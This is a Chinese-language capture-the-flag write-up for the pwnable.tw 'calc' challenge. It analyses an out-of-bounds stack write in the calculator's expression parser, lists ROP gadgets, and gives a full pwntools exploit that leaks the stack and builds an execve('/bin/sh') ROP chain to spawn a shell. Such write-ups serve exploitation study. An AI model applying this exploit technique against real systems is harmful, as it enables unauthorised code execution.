栈溢出ROP链利用
========================================

分析目标
----------------------------------------
+ 程序：`calc.zip <..//_static//calc.zip>`_
+ 来源：https://pwnable.tw/challenge/
+ 程序信息
	::
	
		file calc
		calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, 
			for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped
			
		└─# checksec --file=calc
		RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
		Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   2256) Symbols     No    0               0               calc
		
		注：32位静态链接程序


漏洞分析
----------------------------------------
::
	
	IDA打开main：
	int __cdecl main(int argc, const char **argv, const char **envp)
	{
	  ssignal(14, timeout);
	  alarm(60);
	  puts("=== Welcome to SECPROG calculator ===");
	  fflush(stdout);
	  calc();
	  return puts("Merry Christmas!");
	}
	
	calc函数：
	unsigned int calc()
	{
	  int v1; // [esp+18h] [ebp-5A0h]
	  int v2[100]; // [esp+1Ch] [ebp-59Ch]
	  char s[1024]; // [esp+1ACh] [ebp-40Ch]
	  unsigned int v4; // [esp+5ACh] [ebp-Ch]

	  v4 = __readgsdword(0x14u);
	  while ( 1 )
	  {
		bzero(s, 0x400u);
		if ( !get_expr((int)s, 1024) )
		  break;
		init_pool(&v1);
		if ( parse_expr((int)s, &v1) )
		{
		  printf("%d\n", v2[v1 - 1]);
		  fflush(stdout);
		}
	  }
	  return __readgsdword(0x14u) ^ v4;
	}
	分析栈变量：
	输入的数据存储在s变量，v2保存了计算结果。
	[esp+18h]	v1[xx xx xx xx]=>0x4		==>索引（v2中操作数个数）
	[esp+1Ch]	v2[xx .. .. xx]=>0x64		==>保存结果
	[esp+1ACh]	s [xx .. .. xx]=>0x400		==>输入表达式
	[esp+5ACh]	v4[xx xx xx xx]=>0x4		==>cannary
	init_pool函数用于清空v1,v2。
	parse_expr函数参数：s，v1。
	parse_expr函数主体逻辑：
	for ( i = 0; ; ++i )
	{
		if ( (unsigned int)(*((char *)s + i) - 48) > 9 )
		{
			//符号和结尾0进入
			strcmp(s1, "0")		//这里是判断第一个数是否为0，不允许为0
			v9 = atoi(s1);			//这里是将第一个数转换为数字
			if ( v9 > 0 )		//如果这个数大于0，则放入结果空间里，结果索引*v1加1
			{
				v4 = (*v1)++;
				v1[*v1 + 1] = v9;		//注意此处代码F5有问题，v4应该改为*v1
			}
			if ( *((_BYTE *)s + i) && (unsigned int)(*((char *)s + i + 1) - 48) > 9 )	//不允许出现两个符号
			switch ( *((char *)s + i) )		//运算符比对
			eval函数逻辑：
				v2[*v1-2]=v2[*v1-2] #(即运算符) v2[*v1-1]
		}
	}
	漏洞存在于
	if ( v9 > 0 )
	{
		v4 = (*v1)++;
		v1[*v1 + 1] = v9;
	}	
	输入+9过程：
	eval入口：
	0xffffcbf8  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0xffffcc08  0100 0000 0900 0000 0000 0000 0000 0000  ................
	0xffffcc18  0000 0000 0000 0000 0000 0000 0000 0000  ................
	计算：
	v2[*v1-2]=v2[-1]=1
	v2[*v1-1]=v2[0]=9
	eval出口：
	v2[*v1-2]=v2[*v1-2]+v2[*v1-1]
	即v2[-1]=0xa
	注：出口前v2[*v1-2]进行了一次减1操作，即v2[-1]=v2[-1]-1=0x9
	0xffffcbf8  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0xffffcc08  0900 0000 0900 0000 0000 0000 0000 0000  ................
	0xffffcc18  0000 0000 0000 0000 0000 0000 0000 0000  ................
	结果：v2[*v1-1]=v2[8]=0
	
	发现在eval计算过程中数组v2进行了一次越界写（只能写前一个dword）；
	输入+N，打印结果为v2[N-1]的值，N如果超过一定长度，读取栈上数据。
	
	读取返回地址：
	计算偏移(0x59c+0x4)/4=360,N应该为361
	+361
	134517913
	即0x8049499，main函数中调用calc下一条指令。
	
	输入+9+10过程：
	eval入口：
	0xffffcbf8  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0xffffcc08  0100 0000 0900 0000 0000 0000 0000 0000  ................
	0xffffcc18  0000 0000 0000 0000 0000 0000 0000 0000  ................
	计算：
	v2[*v1-2]=v2[-1]=1
	v2[*v1-1]=v2[0]=9
	eval出口：
	0xffffcbf8  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0xffffcc08  0900 0000 0900 0000 0000 0000 0000 0000  ................
	0xffffcc18  0000 0000 0000 0000 0000 0000 0000 0000  ................
	结果：v2[*v1-1]=v2[8]=0
	if ( v9 > 0 )
	{
		v4 = (*v1)++;
		v1[*v1 + 1] = v9;
	}
	注意此代码将10放在v1[*v1+1]=v1[10]=0xa
	eval入口：
	0xffffcc08  0a00 0000 0900 0000 0000 0000 0000 0000  ................
	0xffffcc18  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0xffffcc28  0000 0000 0000 0000 0a00 0000 0000 0000  ................
	计算：
	v2[*v1-2]=v2[8]=0
	v2[*v1-1]=v2[9]=0xa
	eval出口：
	- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
	0xffffcc08  0900 0000 0900 0000 0000 0000 0000 0000  ................
	0xffffcc18  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0xffffcc28  0000 0000 0a00 0000 0a00 0000 0000 0000  ................
	结果：v2[*v1-1]=v2[8]=0xa=10
	总结：+x+y进行了两次数据写入操作:v2[x]=#,v2[x+1]=y
	
漏洞利用
----------------------------------------
+ ROP
	::
		
		ROPgadget --binary calc --string "/bin/sh"
		Strings information
		============================================================
		没有找到字符串
	
		ROPgadget --binary calc --only 'int'
		Gadgets information
		============================================================
		0x08049a21 : int 0x80

		Unique gadgets found: 1
		
		需要找到一个可用的ROP链执行execve(“/bin/sh”,0,0)的系统调用，进而getshell。
		执行有三个参数的系统调用需要控制4个寄存器，分别是eax，ebx，ecx，edx。
		
		# ROPgadget --binary ./calc --only 'pop|ret' | grep 'eax' 
		0x0809ec3a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
		0x0805c34b : pop eax ; ret
		0x080e0008 : pop eax ; ret 0xfff7
		0x0809ec39 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
		
		# ROPgadget --binary ./calc --only 'pop|ret' | grep 'ecx'
		0x080701d1 : pop ecx ; pop ebx ; ret
		0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret
		
		# ROPgadget --binary ./calc --only 'int'
		0x08049a21 : int 0x80
		
		构造rop链指令：
		0x0805c34b : pop eax ; ret
		0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret
		0x08049a21 : int 0x80
		
		保存ebp的栈的地址：
		+360
		-11800，即0xFFFFD1E8
		
+ EXP
	::
	
		from pwn import *
		import binascii
		context(os='linux',arch='i386',log_level='debug')
		io = remote("chall.pwnable.tw",10100)

		# /bin/sh and gadget
		a = int(binascii.b2a_hex(str.encode('/bin')[::-1]),16)
		b = int(binascii.b2a_hex(str.encode('/sh')[::-1]),16)
		pop_eax = 0x0805c34b
		pop_edx_ecx_ebx = 0x080701d0
		int_80 = 0x08049a21

		# leak ebp
		io.recv()
		io.sendline("+360")
		ebp = int(io.recv())-0x20
		binsh_addr = ebp+8*4

		# attack
		ROP_chain = [pop_eax,11,pop_edx_ecx_ebx,0,0,binsh_addr,int_80,a,b]
		for i in range(361,370):
			num = i - 361
			io.sendline("+"+str(i))
			tmp = int(io.recvline())
			if tmp<ROP_chain[num]:
				io.sendline("+"+str(i)+"+"+str(ROP_chain[num]-tmp))
			else:
				io.sendline("+"+str(i)+"-"+str(tmp-ROP_chain[num]))
			io.recvline()

		io.sendline()
		io.interactive()
		